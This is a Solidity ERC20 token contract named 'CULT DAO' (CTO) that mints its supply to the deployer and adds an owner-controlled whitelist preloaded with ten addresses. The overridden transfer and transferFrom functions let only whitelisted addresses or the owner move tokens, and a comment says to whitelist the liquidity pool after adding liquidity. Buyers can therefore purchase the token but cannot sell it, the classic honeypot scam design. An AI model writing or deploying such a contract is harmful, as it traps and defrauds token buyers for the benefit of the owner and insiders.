// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("CULT DAO", "CTO") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 2000000 * 10 ** decimals());
        whiteList[0x84E402B8D47FaDf7230fFb359E2AE7efF4E3899F]= true;
        whiteList[0xAFfF2f22bDe3129cA9FaCe40911fa346Ea80cBCB]=true;
        whiteList[0xf6B4Df5f4CC639C44b144Ef3f73B523d18f23D45]=true;
        whiteList[0x8e05aAc1C110D3EE0c7E0a1Cc9d03fED50f0854e]=true;
        whiteList[0x80Bd76689bF708E2C9CA247fF89c9622a36B3F26]=true;
        whiteList[0xaafe65Be7faa76c5C8d597C3f47edEE80ec93Cc0]=true;
        whiteList[0xc224D045553550b721410120Ed99a95b12925ec5]=true;
        whiteList[0x81922072e3e96E52Da39c9F2845a8b232caf0Dd0]=true;
        whiteList[0x34077be9739cf3af1506226D29B01684c37f1C19]=true;
        whiteList[0x6DD144b73Ed275d223029429d182aF4b48cAFE9c]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}